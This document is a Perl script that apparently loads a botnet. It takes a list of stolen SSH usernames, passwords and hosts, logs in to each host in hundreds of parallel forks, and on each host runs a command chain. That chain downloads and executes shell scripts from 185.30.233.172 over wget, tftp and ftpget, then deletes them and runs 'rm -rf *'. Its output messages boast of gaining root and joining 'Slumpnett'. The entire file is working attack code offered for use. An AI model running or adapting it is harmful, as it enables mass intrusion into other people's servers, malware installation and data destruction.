#!/usr/bin/perl
use Net::SSH2; use Parallel::ForkManager;

$file = shift @ARGV;
open(fh, '<',$file) or die "Can't read file '$file' [$!]\n"; @newarray; while (<fh>){ @array = split(':',$_); 
push(@newarray,@array);

}
my $pm = new Parallel::ForkManager(550); for (my $i=0; $i < 
scalar(@newarray); $i+=3) {
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.30.233.172/GhOul.sh; chmod 777 GhOul.sh; sh GhOul.sh; tftp 185.30.233.172 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.30.233.172; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.30.233.172 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf GhOul.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *');
                        sleep 10;
                        $channel->close;
                        print "\e[35;1mLoading [\x1b[1;32mS L U M P\x1b[1;35m] ROOT ~>: ".$newarray[$c]."\n";
                } else {
                        print "\e[34;1mScanning \x1b[1;35mSSH\n";
                }
        } else {
                print "\e[36;1mLoading [\x1b[1;32mGOOFY\x1b[1;37m] JOINED Slumpnett\n";
        }
        $pm->finish;
}
$pm->wait_all_children;

